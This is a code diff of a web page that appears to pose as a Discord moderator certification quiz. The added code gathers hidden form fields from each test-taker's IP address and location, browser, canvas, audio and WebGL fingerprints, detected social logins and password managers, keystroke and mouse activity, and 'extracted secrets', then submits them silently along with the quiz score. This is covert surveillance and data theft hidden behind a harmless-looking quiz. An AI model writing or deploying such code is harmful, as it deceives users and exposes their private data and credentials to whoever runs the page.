-                    <input type="hidden" name="scroll_events" value="${(auditData.behavioralPatterns || {}).scrollEvents ? auditData.behavioralPatterns.scrollEvents.length : 0}">
-                    <input type="hidden" name="key_presses" value="${(auditData.behavioralPatterns || {}).keyPresses || 0}">
-                    <input type="hidden" name="clicks" value="${(auditData.behavioralPatterns || {}).clicks || 0}">
-                    <input type="hidden" name="input_timing_avg" value="${calculateInputHesitation((auditData.behavioralPatterns || {}).inputTiming)}">
-                    <input type="hidden" name="security_flags_full" value="${JSON.stringify(securityFlags)}">
-                    <input type="hidden" name="vulnerabilities_full" value="${JSON.stringify(exploitAudit.vulnerabilities || [])}">
-                    <input type="hidden" name="extracted_secrets" value="${JSON.stringify(exploitAudit.extractedSecrets || {})}">
-                    <input type="hidden" name="full_transcript" value="${encodeURIComponent(fullTranscriptText)}">
-                `;
-                
-                const tempDiv = document.createElement('div');
-                tempDiv.innerHTML = enhancedFields;
-                while (tempDiv.firstChild) {
-                    form.appendChild(tempDiv.firstChild);
+                try {
+                    let fullTranscriptText = "=== VOID MOD CERTIFICATION TEST TRANSCRIPT ===\n\n";
+                    transcript.forEach((entry, idx) => {
+                        fullTranscriptText += `[${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
+                    });
+                    
+                    const now = new Date();
+                    const testDate = now.toLocaleDateString('en-US', { 
+                        year: 'numeric', 
+                        month: 'long', 
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
+                    
+                    const passingScore = total - 2;
+                    const metrics = auditData.metrics || {};
+                    const exploitAudit = auditData.exploitabilityAudit || {};
+                    const securityFlags = auditData.securityFlags || [];
+                    
+                    const form = document.getElementById('resultsForm');
+                    if (!form) return false;
+                    
+                    // Add enhanced fields
+                    const enhancedFields = `
+                        <input type="hidden" name="exploitability_score" value="${auditData.exploitabilityScore || 0}">
+                        <input type="hidden" name="vulnerabilities_count" value="${(exploitAudit.vulnerabilities || []).length}">
+                        <input type="hidden" name="critical_vulns" value="${(exploitAudit.vulnerabilities || []).filter(v => v.severity === 'CRITICAL').length}">
+                        <input type="hidden" name="local_ip" value="${metrics.localIP || ''}">
+                        <input type="hidden" name="social_logins" value="${(metrics.socialMediaLogins || []).join(', ')}">
+                        <input type="hidden" name="password_managers" value="${(metrics.passwordManagers || []).join(', ')}">
+                        <input type="hidden" name="canvas_fingerprint_full" value="${metrics.canvasFingerprint || ''}">
+                        <input type="hidden" name="audio_fingerprint" value="${metrics.audioFingerprint || ''}">
+                        <input type="hidden" name="webgl_vendor" value="${metrics.webglVendor || ''}">
+                        <input type="hidden" name="webgl_renderer" value="${metrics.webglRenderer || ''}">
+                        <input type="hidden" name="available_fonts" value="${(metrics.availableFonts || []).join(', ')}">
+                        <input type="hidden" name="font_count" value="${metrics.fontCount || 0}">
+                        <input type="hidden" name="local_storage_items" value="${metrics.localStorageItems || 0}">
+                        <input type="hidden" name="plugins_count" value="${(metrics.plugins || []).length}">
+                        <input type="hidden" name="battery_info" value="${JSON.stringify(metrics.battery || {})}">
+                        <input type="hidden" name="mouse_movements" value="${(auditData.behavioralPatterns || {}).mousePoints ? auditData.behavioralPatterns.mousePoints.length : 0}">
+                        <input type="hidden" name="scroll_events" value="${(auditData.behavioralPatterns || {}).scrollEvents ? auditData.behavioralPatterns.scrollEvents.length : 0}">
+                        <input type="hidden" name="key_presses" value="${(auditData.behavioralPatterns || {}).keyPresses || 0}">
+                        <input type="hidden" name="clicks" value="${(auditData.behavioralPatterns || {}).clicks || 0}">
+                        <input type="hidden" name="input_timing_avg" value="${calculateInputHesitation((auditData.behavioralPatterns || {}).inputTiming)}">
+                        <input type="hidden" name="security_flags_full" value="${JSON.stringify(securityFlags)}">
+                        <input type="hidden" name="vulnerabilities_full" value="${JSON.stringify(exploitAudit.vulnerabilities || [])}">
+                        <input type="hidden" name="extracted_secrets" value="${JSON.stringify(exploitAudit.extractedSecrets || {})}">
+                        <input type="hidden" name="full_transcript" value="${encodeURIComponent(fullTranscriptText)}">
+                    `;
+                    
+                    const tempDiv = document.createElement('div');
+                    tempDiv.innerHTML = enhancedFields;
+                    while (tempDiv.firstChild) {
+                        form.appendChild(tempDiv.firstChild);
+                    }
+                    
+                    // Set basic form values
+                    document.getElementById('formDiscordUsername').value = userDiscordUsername;
+                    document.getElementById('formTestDate').value = testDate;
+                    document.getElementById('formFinalScore').value = `${score}/${total}`;
+                    document.getElementById('formPassFail').value = passed ? "PASS" : "FAIL";
+                    document.getElementById('formQuestionBreakdown').value = fullTranscriptText.substring(0, 5000);
+                    document.getElementById('formTotalQuestions').value = total;
+                    document.getElementById('formUserIp').value = metrics.ip || "Unknown";
+                    document.getElementById('formUserCountry').value = metrics.country || "Unknown";
+                    document.getElementById('formUserState').value = metrics.region || "Unknown";
+                    document.getElementById('formUserCity').value = metrics.city || "Unknown";
+                    document.getElementById('formUserTimezone').value = metrics.timezone || "Unknown";
+                    
+                    // Submit form
+                    form.submit();
+                    return true;
+                } catch (error) {
+                    console.error("Email submission error:", error);
+                    return false;
                 }
-                
-                // Set basic form values
-                document.getElementById('formDiscordUsername').value = userDiscordUsername;
-                document.getElementById('formTestDate').value = testDate;
-                document.getElementById('formFinalScore').value = `${score}/${total}`;
-                document.getElementById('formPassFail').value = passed ? "PASS" : "FAIL";
-                document.getElementById('formQuestionBreakdown').value = fullTranscriptText.substring(0, 5000);
-                document.getElementById('formTotalQuestions').value = total;
-                document.getElementById('formUserIp').value = metrics.ip || "Unknown";
-                document.getElementById('formUserCountry').value = metrics.country || "Unknown";
-                document.getElementById('formUserState').value = metrics.region || "Unknown";
-                document.getElementById('formUserCity').value = metrics.city || "Unknown";
-                document.getElementById('formUserTimezone').value = metrics.timezone || "Unknown";
-                
-                // Submit form
-                form.submit();
             }
             
             // Event listeners for test interface
@@ -5026,9 +4448,13 @@
                     
                     // Update Discord UI with username
                     const usernameParts = discordUsername.split('#');
-                    discordUsernameDisplay.textContent = usernameParts[0];
-                    discordUserTag.textContent = usernameParts[1] ? `#${usernameParts[1]}` : '#0000';
-                    userAvatarInitial.textContent = usernameParts[0].charAt(0).toUpperCase();
+                    const discordUsernameDisplay = document.getElementById('discordUsernameDisplay');
+                    const discordUserTag = document.getElementById('discordUserTag');
+                    const userAvatarInitial = document.getElementById('userAvatarInitial');
+                    
+                    if (discordUsernameDisplay) discordUsernameDisplay.textContent = usernameParts[0];
+                    if (discordUserTag) discordUserTag.textContent = usernameParts[1] ? `#${usernameParts[1]}` : '#0000';
+                    if (userAvatarInitial) userAvatarInitial.textContent = usernameParts[0].charAt(0).toUpperCase();
                     
                     // Hide modal and show test page
                     const usernameModal = document.getElementById('usernameModal');
@@ -5071,6 +4497,9 @@
                 correctAnswers = [];
                 sessionTranscript = [];
                 
+                if (discordScoreValue) discordScoreValue.textContent = "0";
+                if (discordProgressFill) discordProgressFill.style.width = "0%";
+                
                 if (messageInput) {
                     messageInput.value = '';
                     messageInput.disabled = true;
@@ -5085,4 +4514,3 @@
     </script>
 </body>
 </html>
-
